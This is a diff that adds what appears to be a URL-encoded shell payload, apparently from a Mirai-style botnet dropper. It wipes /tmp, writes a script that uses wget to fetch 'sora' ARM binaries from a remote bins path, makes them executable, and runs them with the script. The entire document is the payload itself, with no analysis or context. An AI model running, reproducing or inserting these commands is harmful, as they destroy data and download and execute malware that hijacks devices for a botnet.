@@ -1,0 +1,9 @@
+rm+-rf+/tmp/*
+echo+-e+"cd+/tmp"+>+/tmp/exploited
+echo+-e+"wget+http:/\/0.0.0.0/bins/sora.arm7"+>>+/tmp/exploited
+echo+-e+"wget+http:/\/0.0.0.0/bins/sora.arm"+>>+/tmp/exploited
+echo+-e+"chmod+777+/tmp/sora.arm7"+>>+/tmp/exploited
+echo+-e+"chmod+777+/tmp/sora.arm"+>>+/tmp/exploited
+echo+-e+"/tmp/sora.arm7+exploit.arm7"+>>+/tmp/exploited
+echo+-e+"/tmp/sora.arm+exploit.arm"+>>+/tmp/exploited
+sh+/tmp/exploited
